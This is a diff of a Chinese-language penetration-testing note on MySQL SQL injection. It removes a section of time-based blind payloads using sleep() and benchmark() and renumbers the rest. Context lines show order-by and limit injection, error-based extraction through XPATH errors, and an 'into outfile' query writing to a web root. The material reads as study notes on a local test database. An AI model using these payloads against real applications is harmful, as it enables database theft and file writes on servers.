@@ -9,41 +9,7 @@ topics = ["Pentest"]
 
 环境：MySQL 5.5.47
 
-### 0x00 基于时间的注入payload
-```
-mysql> select if((select database()) like "rte%",sleep(2),null);
-+---------------------------------------------------+
-| if((select database()) like "rte%",sleep(2),null) |
-+---------------------------------------------------+
-|                                                 0 |
-+---------------------------------------------------+
-1 row in set (2.00 sec)
-
-mysql> select if((select database())="rteaaa",sleep(2),666);
-+-----------------------------------------------+
-| if((select database())="rtest1",sleep(2),666) |
-+-----------------------------------------------+
-|                                           666 |
-+-----------------------------------------------+
-1 row in set (0.00 sec)
-
-mysql> select if((select database())="rtest",sleep(2),666);
-+----------------------------------------------+
-| if((select database())="rtest",sleep(2),666) |
-+----------------------------------------------+
-|                                            0 |
-+----------------------------------------------+
-1 row in set (2.00 sec)
-```
-```
-mysql> select id,name,title from msg where id=if(1=1,benchmark(10000000,md5(11)),false);
-Empty set (2.18 sec)
-
-mysql> select id,name,title from msg where id=if(1=2,benchmark(10000000,md5(11)),false);
-Empty set (0.00 sec)
-```
-
-### 0x01 注入点在Order by后面
+### 0x00 注入点在Order by后面
 ```
 mysql> select id,name,content from msg where id>1 order by id into outfile 'C:\\Apps\\phpStudy\\WWW\\a.txt';
 Query OK, 1 row affected (0.01 sec)
@@ -78,7 +44,7 @@ mysql> select name from msg where id>1 order by (select case when(2<1) then 1 el
 ERROR 1242 (21000): Subquery returns more than 1 row
 ```
 
-### 0x02 注入点在limit后面
+### 0x01 注入点在limit后面
 
 * limit前面没有order by可以使用union、analyse()
 
@@ -118,7 +84,7 @@ mysql> select id,name,content from msg where id>1 order by name limit 1,1 proced
 ERROR 1105 (HY000): XPATH syntax error: '~5.5.47~'
 ```
 
-### 0x03 根据报错得到数据库名、表名、列名
+### 0x02 根据报错得到数据库名、表名、列名
 ```
 #得到数据库名为rtest
 mysql> select id,name,content from msg where id=2-a();
@@ -143,7 +109,7 @@ mysql> select id,name,content from msg where id=2 and (select * from(select * fr
 ERROR 1241 (21000): Operand should contain 1 column(s)
 ```
 
-### 0x04 MySQL的隐式转换
+### 0x03 MySQL的隐式转换
 * 官方隐式转换规则
     * 两个参数至少有一个是 NULL 时，比较的结果也是 NULL，例外是使用 <=> 对两个 NULL 做比较时会返回 1，这两种情况都不需要做类型转换
     * 两个参数都是字符串，会按照字符串来比较，不做类型转换
